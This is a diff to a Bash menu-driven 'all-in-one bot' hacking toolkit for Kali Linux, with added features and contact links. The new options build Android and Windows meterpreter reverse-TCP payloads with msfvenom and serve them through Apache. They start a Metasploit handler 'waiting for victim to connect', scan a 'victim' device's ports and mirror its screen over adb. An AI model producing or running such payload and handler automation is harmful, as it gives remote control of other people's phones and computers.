@@ -14,19 +14,18 @@ w="\e[1;37m"      # putih tebal     #thick white
 
 
 ###############################give Permissons,if not root user exit
-version = "v1.5"
 echo -e "${lb}
                         _       ___     ______            
                        | |     / \ \   / / ___| _   _ ___ 
                       / __)   / _ \ \ / /\___ \| | | / __|
                       \__ \  / ___ \ V /  ___) | |_| \__ /
                       (   / /_/   \_\_/  |____/ \__,_|___/
-                       |_|$version
+                       |_|
 ${n}" | lolcat
 echo -e "${lb}
-                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
-                      |S|E|C|U|R|I|T|Y| |E|D|I|T|I|O|N|
-                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
+                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-++-+-+
+                      |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|
+                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-
 
 $version
 ${n}" | lolcat
@@ -35,7 +34,15 @@ echo -e "${lb}
 |E|N|G|I|N|E| |<=>| |K|A|L|I|
 +-+-+-+-+-+-+ +-+ +-+-+-+-+-+
 ${n}" | lolcat
-echo "ALL-IN-ONE BOT BY AVS" | lolcat
+echo -e "\n\n\n"
+
+echo "<--------------------------------------------------------------------------->" | lolcat
+echo "| [-] ALL-IN-BOT-BY-AVS                                                     |" | lolcat
+echo "|                                                                           |" | lolcat
+echo "| [+] DISCORD: https://discord.gg/M45DuEN5nH                                |" | lolcat
+echo "| [+] EMAIL: kanishkasingh0885@gmail.com                                    |" | lolcat
+echo "| [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |" | lolcat
+echo "<--------------------------------------------------------------------------->" | lolcat
 
 echo -e "\n\n\n"
 echo "[+] COMMANDS:" | lolcat
@@ -55,6 +62,8 @@ echo "[14] SCAN A FILE FOR VIRUSES" | lolcat
 echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
 echo "[16] FULL SCAN THIS PC" | lolcat
 echo "[17] CREATE A VIRUS FOR ANDROID" | lolcat
+echo "[18] CREATE A VIRUS FOR WINDOWS" | lolcat
+echo "[19] MAC OS FOR KALI LINUX" | lolcat
 echo "[99] ADDITIONAL commands" | lolcat
 
 echo -e "\n\n\n"
@@ -234,7 +243,15 @@ process_input() {
         echo "[+] CHECKING ALL OPEN PORTS OF VICTEM DEVICE..." | lolcat
         nmap $connected_device_ip | lolcat
         echo -e "\n\n\n"
-        SCRCPY
+        ;;
+        7)
+        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
+        echo "[+] VICTEM'S PRIVATE IP:$connected_device_ip"
+        echo "[+] CHECKING ALL OPEN PORTS OF VICTEM'S DEVICE..."
+        nmap $connected_device_ip
+        echo "[+] STARTING SCRCPY TO MONITOR DEVICE PLEASE BE IN SAME NETWORK..."
+        echo "[-] FOR ANY HELP RELATED TO SCRCPY TYPE: SCRCPY HELP"
+        scrcpy
         ;;
         8)
         echo "[+] REMOVING LOCKSCREEN BUT NOT ALL VERSION IS SUPPORTED" | lolcat
@@ -301,6 +318,9 @@ process_input() {
         echo "[+] INSTALLING TELEGRAM" | lolcat
         sudo apt install telegram-desktop
         ;;
+        "ls")
+        ls | lolcat
+        ;;
         13)
         figlet -c "PHONEINFOS" | lolcat
         figlet -c "BY AVS" | lolcat
@@ -361,6 +381,9 @@ process_input() {
             echo "[-] VIRUS FOUND IN THIS FILE"
         fi
         ;;
+        "msfconsole")
+        msfconsole
+        ;;
         15)
         read -p "[+] ENTER THE URL OF YOUR WEB: " website_url
         echo "[+] WEBSITE SCANNING..." | lolcat
@@ -398,7 +421,88 @@ process_input() {
         echo ""
         ;;
         17)
-        
+        echo "[+] CREATING PAYLOAD FOR ANDROID..." | lolcat
+        own_ip=$(hostname -I | awk '{ print $1 }')
+        msfvenom -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
+        echo "[+] PAYLOAD CREATED: Avs-andropayload.apk " | lolcat        
+        echo "[-] STARTING APACHE2 SERVICE..." | lolcat
+        service apache2 start
+	if [ -f Avs-andropayload.apk ]; then
+
+	  # Ask for confirmation
+	  echo "[+] DO YOU WANT TO MOVE APPM.APK TO /VAR/WWW/HTML? [y/n]" 
+	  read response
+
+	  # If the user says yes, move the file
+	  if [[ $response == "y" ]]; then
+	    mv Avs-andropayload.apk /var/www/html
+	  else
+	    echo "File not moved."
+	  fi
+
+	else
+	  echo "File does not exist."
+	fi
+	cd /var/www/html
+	echo "[+] CHANGED DIRECTORY TO /VAR/WWW/HTML" | lolcat
+        echo "[+] EXECUTING COMMANDS TO START HACKING..." | lolcat
+        echo "[-] STARTING THE EXPLOIT..." | lolcat
+        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
+        echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
+        ;;
+        18)
+        echo "[+] CREATING PAYLOAD FOR WINDOWS..." | lolcat
+        own_ip=$(hostname -I | awk '{ print $1 }')
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-winpayload.exe
+        echo "[+] PAYLOAD CREATED: Avs-winpayload.exe " | lolcat        
+        echo "[-] STARTING APACHE2 SERVICE..." | lolcat
+        service apache2 start
+	if [ -f Avs-winpayload.exe ]; then
+
+	  # Ask for confirmation
+	  echo "[+] DO YOU WANT TO MOVE CREATED PAYLOAD TO /VAR/WWW/HTML? [y/n]" 
+	  read response
+
+	  # If the user says yes, move the file
+	  if [[ $response == "y" ]]; then
+	    mv Avs-winpayload.exe /var/www/html
+	  else
+	    echo "File not moved."
+	  fi
+
+	else
+	  echo "File does not exist."
+	fi
+	cd /var/www/html
+	echo "[+] CHANGED DIRECTORY TO /VAR/WWW/HTML" | lolcat
+        echo "[+] EXECUTING COMMANDS TO START HACKING..." | lolcat
+        echo "[-] STARTING THE EXPLOIT..." | lolcat
+        msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
+        echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
+        ;;
+        19)
+        echo "[+] CREATING DIRECTORY... " | lolcat
+        mkdir ~/.themes
+        mkdir ~/.icons
+        cd ~/.themes
+        echo "[+] DOWNLOADING ALL REQUIRED PACKAGES..." | lolcat
+        echo "[+] DOWNLOADING SHELL FILE..."
+        git clone https://github.com/B00merang-Project/macOS.git
+        git clone https://github.com/B00merang-Project/macOS-Catalina-Dark.git
+        echo "[+] INSTALLING PLANK..." | lolcat
+        sudo apt install plank
+        cd ~/.icons
+        echo "[+] INSTALLING WGET..." | lolcat
+        sudo apt install wget
+        echo "[+] DOWNLOADING ICON PACK"
+        wget https://github.com/keeferrourke/la-capitaine-icon-theme/archive/refs/tags/v0.6.2.zip
+        echo "[+] UNZIPPING ICON PACK..."
+        unzip v0.6.2.zip
+        rm -i v0.6.2.zip
+        echo "[+] DOWNLOADING IS COMPLETED..."
+        echo "[+] OPENING GNOME-TWEAKS"
+        echo "[+] THAT'S IT AS A TEXT BASED TOOL I CAN'T CHANGE THE THEME OF YOUR KALI MACHINE SO TO CHANGE THE APPEARANCE GO TO APPEARANCE THEN IN SHELL CHOOSE MAC OS, IN ICONS CHOOSE la-capitaine-icon-theme AND IN STARTUP APPS ADD A NEW APP AND ADD PLANK, GO TO THEMES AND DISABLE DASH-TO-DOCK DONE. THANKYOU."
+        gnome-tweaks
         ;;
         "99")
 	echo "[+] COMMANDS:" | lolcat
@@ -422,6 +526,25 @@ process_input() {
         echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
         echo "[+] BOT TO PERSON COMMANDS" | lolcat
         echo -e "\n\n"
+        ;;
+        "install metasploit on termux")
+	pkg update && pkg upgrade
+	pkg install -U git python ruby wget
+	cd
+	wget https://github.com/rapid7/metasploit-framework/archive/master.zip
+	unzip master.zip
+	rm master.zip
+	cd metasploit-framework-master
+	./msfconsole
+        ;;
+        "scrcpy help")
+        echo "[-] SORRY SIR IF YOU'RE FACING ISSUE RELATED TO SCRCPY" | lolcat
+        echo "[+] SOLUTION 1:"| lolcat
+        echo "[+] type: 'install scrcpy' TO INSTALL IT MAY BE THIS WILL HELP YOU" | lolcat
+        echo "[-] SOLUTION 2: " | lolcat
+        echo "[+] BE IN SAME NETWORK AND TRY ADB CONNECT [VICTEM'S IP]:[OPEN PORT OF VICTEM'S DEVICE]" | lolcat
+        echo "[+] THANKYOU. IF STILL IT CAN'T HELP YOU THEN KINDLY JOIN OUR DISCORD TYPE 'links' FOR OUR DISCORD LINK ^-^ " | lolcat
+        
         ;;
         "install scrcpy")
         sudo apt install git
@@ -519,6 +642,11 @@ process_input() {
         ;;
         "ok cheer me up")
         echo "SIR YOU'RE THE BEST BECAUSE OF YOU I AM HERE, THANKYOU"
+        ;;
+        "links")
+        echo "[+] DISCORD: https://discord.gg/M45DuEN5nH " | lolcat
+        echo "[+] EMAIL: kanishkasingh0885@gmail.com" | lolcat
+        echo "[+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw " | lolcat
         ;;
         "how are you")
             echo "I'm doing well, thank you! How about you?"
@@ -657,7 +785,7 @@ process_input() {
 # Main loop to process user input
 while true; do
     echo -e "\n\n"
-    echo "┌──($ AVSUS㉿X)-[v1.8]" | lolcat
+    echo "┌──($ AVSUS㉿X)-[v1.9]" | lolcat
     read -p "└──$" input 
     process_input "$input"
 done
